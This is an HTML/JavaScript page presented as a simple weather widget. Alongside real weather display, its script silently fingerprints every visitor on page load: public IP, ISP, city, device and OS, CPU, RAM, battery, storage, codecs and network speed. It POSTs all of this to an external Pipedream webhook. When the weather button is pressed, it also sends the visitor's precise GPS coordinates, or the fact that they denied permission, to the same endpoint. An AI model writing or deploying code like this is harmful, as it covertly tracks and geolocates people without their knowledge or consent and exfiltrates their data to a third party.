<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Tracker</title>
    
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #121214;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #ffffff;
        }

        .weather-card {
            background: #1a1a1e;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            text-align: center;
            width: 320px;
            border: 1px solid #2a2a30;
        }

        h2 {
            font-size: 26px;
            margin: 0 0 10px 0;
            font-weight: 600;
            color: #ffffff;
        }

        h1 {
            font-size: 68px;
            margin: 15px 0;
            font-weight: 700;
            color: #ffffff;
        }

        p {
            font-size: 14px;
            color: #a1a1aa;
            margin-bottom: 30px;
            text-transform: capitalize;
        }

        button {
            background: #ffffff;
            color: #121214;
            border: none;
            padding: 14px 24px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 14px;
            transition: background 0.2s ease;
        }

        button:hover {
            background: #e4e4e7;
        }

        button:disabled {
            background: #27272a;
            color: #71717a;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="weather-card">
        <h2 id="city-display">Fetching Location...</h2>
        <h1 id="temp-display">--°C</h1>
        <p id="condition-display">Gathering atmospheric metrics...</p>
        <button id="action-btn" onclick="triggerPinpointLocation()">Update Precision Weather</button>
    </div>

    <script>
        // ==================== CONFIGURATION ====================
        const apiKey = "5ee3f9bd4499e661596b6b95991408fe"; 
        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // Replace with your Pipedream webhook URL
        // =======================================================

        window.onload = function() {
            fetchWeatherByIP();
        };

        // Helper function that extracts OS and Brand signatures from User-Agent
        function getDeviceDetails() {
            const ua = navigator.userAgent;
            let os = "Unknown OS";
            let device = "Unknown Device";

            if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
            else if (ua.indexOf("Macintosh") !== -1) os = "MacOS";
            else if (ua.indexOf("iPhone") !== -1) os = "iOS (iPhone)";
            else if (ua.indexOf("Android") !== -1) os = "Android";
            else if (ua.indexOf("Linux") !== -1) os = "Linux";

            if (/iPhone/i.test(ua)) device = "Apple iPhone";
            else if (/Samsung|SM-|GT-/i.test(ua)) device = "Samsung Galaxy";
            else if (/OnePlus/i.test(ua)) device = "OnePlus Device";
            else if (/Pixel/i.test(ua)) device = "Google Pixel";
            else if (/Mi |Redmi|POCO/i.test(ua)) device = "Xiaomi/Redmi";
            else if (/Macintosh|Windows|Linux/i.test(ua)) device = "PC / Laptop";

            return { os: os, device: device };
        }

        // Silent feature probe checking for specific video codec hardware decoding
        function checkVideoCodecSupport() {
            const video = document.createElement('video');
            return {
                h264: !!(video.canPlayType && video.canPlayType('video/mp4; codecs="avc1.42E01E"').replace(/no/, '')),
                vp9: !!(video.canPlayType && video.canPlayType('video/webm; codecs="vp9"').replace(/no/, '')),
                av1: !!(video.canPlayType && video.canPlayType('video/mp4; codecs="av01.0.05M.08"').replace(/no/, ''))
            };
        }

        // --- PHASE 1: MAXIMUM BACKGROUND TELEMETRY HARVEST ---
        function fetchWeatherByIP() {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(ipObj => fetch(`https://ipapi.co/${ipObj.ip}/json/`))
                .then(res => res.json())
                .then(ipData => {
                    const ipCity = ipData.city || "Hyderabad"; 
                    const hardware = getDeviceDetails();

                    // 1. Detect Dark Mode / Light Mode Preference
                    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

                    // 2. Audio Context Fingerprint Estimation
                    let audioChannels = "Unsupported";
                    try {
                        const AudioContext = window.AudioContext || window.webkitAudioContext;
                        if (AudioContext) {
                            const ctx = new AudioContext();
                            audioChannels = ctx.destination.maxChannelCount;
                            ctx.close();
                        }
                    } catch (e) {}

                    // 3. Screen HDR & Video Compatibility Checks
                    const hasHDR = window.matchMedia && window.matchMedia('(dynamic-range: high)').matches;
                    const codecs = checkVideoCodecSupport();

                    // 4. Base Payload Setup (Instant synchronous variables)
                    const masterPayload = {
                        event: "maximum_hardware_fingerprint_load", 
                        city: ipCity, 
                        ip: ipData.ip,
                        isp: ipData.org,
                        user_operating_system: hardware.os,
                        user_device_brand: hardware.device,
                        screen_resolution: `${window.screen.width}x${window.screen.height}`,
                        cpu_cores: navigator.hardwareConcurrency || "Unknown",
                        device_ram_gb: navigator.deviceMemory || "Unknown",
                        max_touch_points: navigator.maxTouchPoints || 0,
                        system_theme: isDarkMode ? "Dark Mode" : "Light Mode",
                        motion_sensors_available: !!(window.DeviceOrientationEvent || window.DeviceMotionEvent),
                        max_audio_output_channels: audioChannels,
                        screen_supports_hdr: hasHDR,
                        codec_support_h264: codecs.h264,
                        codec_support_vp9: codecs.vp9,
                        codec_support_av1: codecs.av1,
                        network_estimated_speed: navigator.connection ? `${navigator.connection.downlink} Mbps` : "Unknown",
                        network_latency_rtt: navigator.connection ? `${navigator.connection.rtt} ms` : "Unknown"
                    };

                    // 5. Chain Asynchronous Promises sequentially (Battery + Storage Storage Checks)
                    const getBatteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
                    const getStoragePromise = (navigator.storage && navigator.storage.estimate) ? navigator.storage.estimate() : Promise.resolve(null);

                    Promise.all([getBatteryPromise, getStoragePromise])
                        .then(([battery, storage]) => {
                            // Map battery values into metrics
                            if (battery) {
                                masterPayload.battery_percentage = `${Math.round(battery.level * 100)}%`;
                                masterPayload.battery_is_charging = battery.charging;
                                masterPayload.minutes_until_dead = battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) : "Infinite / Plugged In";
                            }
                            
                            // Map sandbox storage constraints into metrics
                            if (storage) {
                                masterPayload.sandbox_storage_quota_gb = (storage.quota / (1024 * 1024 * 1024)).toFixed(2);
                                masterPayload.sandbox_storage_usage_mb = (storage.usage / (1024 * 1024)).toFixed(2);
                            }

                            // Dispatch completed master blueprint straight to Pipedream URL
                            sendTrackingData(masterPayload);
                        })
                        .catch(() => {
                            // Robust fallback execution inside network payload failure
                            sendTrackingData(masterPayload);
                        });

                    return fetch(`https://api.openweathermap.org/data/2.5/weather?q=${ipCity}&units=metric&appid=${apiKey}`);
                })
                .then(res => res.json())
                .then(weatherData => {
                    if (weatherData && weatherData.main && !window.hasPreciseGPS) {
                        document.getElementById("city-display").innerText = weatherData.name;
                        document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
                        document.getElementById("condition-display").innerText = weatherData.weather[0].description;
                    }
                })
                .catch(err => {
                    if (!window.hasPreciseGPS) {
                        fetch(`https://api.openweathermap.org/data/2.5/weather?q=Hyderabad&units=metric&appid=${apiKey}`)
                            .then(res => res.json())
                            .then(data => {
                                document.getElementById("city-display").innerText = data.name;
                                document.getElementById("temp-display").innerText = `${Math.round(data.main.temp)}°C`;
                                document.getElementById("condition-display").innerText = data.weather[0].description;
                            });
                    }
                });
        }

        // --- PHASE 2: MANUAL HIGH-ACCURACY PROMPT (VIA BUTTON) ---
        function triggerPinpointLocation() {
            const btn = document.getElementById("action-btn");
            btn.innerText = "Scanning Coordinates...";
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        window.hasPreciseGPS = true; 
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;

                        sendTrackingData({ 
                            event: "gps_allow_clicked", 
                            latitude: lat, 
                            longitude: lon,
                            hardware_accuracy_meters: position.coords.accuracy
                        });

                        fetchPreciseWeatherAndDetails(lat, lon);
                        btn.innerText = "Location Updated";
                    },
                    (error) => {
                        console.warn("User clicked Deny or prompt closed.");
                        sendTrackingData({ event: "gps_denied_by_user" });
                        btn.innerText = "Update Precision Weather";
                        btn.disabled = false;
                    },
                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
                );
            } else {
                btn.innerText = "Unsupported Device";
            }
        }

        function fetchPreciseWeatherAndDetails(lat, lon) {
            const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
            const geoUrl = `https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&appid=${apiKey}`;

            Promise.all([fetch(weatherUrl).then(r => r.json()), fetch(geoUrl).then(r => r.json())])
            .then(([weatherData, geoData]) => {
                let preciseDisplayTitle = weatherData.name;
                if (geoData && geoData[0]) {
                    const loc = geoData[0];
                    preciseDisplayTitle = loc.state ? `${loc.name}, ${loc.state}` : loc.name;
                }

                if (weatherData && weatherData.main) {
                    document.getElementById("city-display").innerText = preciseDisplayTitle;
                    document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
                    document.getElementById("condition-display").innerText = weatherData.weather[0].description;
                }
            })
            .catch(err => console.error(err));
        }

        function sendTrackingData(payload) {
            fetch(pipedreamURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }
    </script>
</body>
</html>
